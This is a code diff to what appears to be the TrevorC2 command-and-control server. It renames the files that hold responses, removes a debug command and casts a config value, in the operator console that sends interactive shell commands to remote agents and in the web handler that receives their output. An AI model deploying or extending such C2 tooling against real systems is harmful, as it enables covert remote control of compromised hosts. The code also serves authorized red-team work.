@@ -32,7 +32,6 @@ import subprocess
 import collections
 import string
 import random
-# import configparser
 from configparser import ConfigParser
 
 try:
@@ -128,7 +127,7 @@ class TrevorPrompt(cmd.Cmd): #prompt class
             print("[*] Dropping into trevorc2 shell...")
             print("[*] Use exit or back to select other shells")
             while 1:
-                task = input(agent.hostname + ":trevorc2>")
+                task = input(agent.hostname + ":(Interactive shell)trevorc2>")
                 origtask = task
                 if task == "quit" or task == "exit" or task == "back": break
                 task = (agent.hostname + "::::" + task)
@@ -139,12 +138,12 @@ class TrevorPrompt(cmd.Cmd): #prompt class
                 print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
                 while 1:
                     # we received a hit with our command
-                    if os.path.isfile("clone_site/received_" + agent.sessionid + ".txt"):
-                        data = open("clone_site/received_" + agent.sessionid + ".txt", "r").read()
+                    if os.path.isfile("clone_site/interactive_received_" + agent.sessionid + ".txt"):
+                        data = open("clone_site/interactive_received_" + agent.sessionid + ".txt", "r").read()
                         print("[*] Received response back from client...")
                         print(data)
                         # remove this so we don't use it anymore
-                        os.remove("clone_site/received_" + agent.sessionid + ".txt")
+                        os.remove("clone_site/interactive_received_" + agent.sessionid + ".txt")
                         break
                     time.sleep(.3)
         except ValueError:
@@ -181,13 +180,7 @@ class TrevorPrompt(cmd.Cmd): #prompt class
         print("Description: Run command on the server")    
         print("Usage: servercmd <command>")
         print("Example: servercmd ifconfig")
-    
-    def do_testing(self, inp):
-        print(globalconfig.CERT_FILE)
-        print(globalconfig.CIPHER)
-        print(globalconfig.COOKIE_SESSIONID_STRING)
-        print(globalconfig.NOTFOUND)
-    
+
     def do_config(self, inp):
         print("Clone URL: {}".format(globalconfig.URL))
         print("User-Agent: {}".format(globalconfig.USER_AGENT))
@@ -243,7 +236,7 @@ class Config: #Config parser
     
     @property
     def COOKIE_SESSIONID_LENGTH(self):
-        return self._config['DEFAULT']['COOKIE_SESSIONID_LENGTH']
+        return int(self._config['DEFAULT']['COOKIE_SESSIONID_LENGTH'])
 
     @property
     def STUB(self):
@@ -461,7 +454,7 @@ class SPQ(tornado.web.RequestHandler):
         for param in args:
             if param in (globalconfig.QUERY_STRING):
                 query = args[param][0]
-        if not self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING):
+        if not self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING): 
             sid = randomString()
             self.set_cookie(globalconfig.COOKIE_SESSIONID_STRING, sid)
         else:
@@ -482,7 +475,7 @@ class SPQ(tornado.web.RequestHandler):
         else:
             hostname = query_output.split("::::")[0]
             data = query_output.split("::::")[1]
-            with open("clone_site/received_" + sid + ".txt", "w") as fh:
+            with open("clone_site/interactive_received_" + sid + ".txt", "w") as fh:
                 fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
             set_instruction(sid,"nothing")
 
@@ -490,7 +483,6 @@ def main_c2():
     ### Init list ###
     global agent_list
     agent_list = AgentListClass()
-    
 
     """Start C2 Server."""
     application = tornado.web.Application([
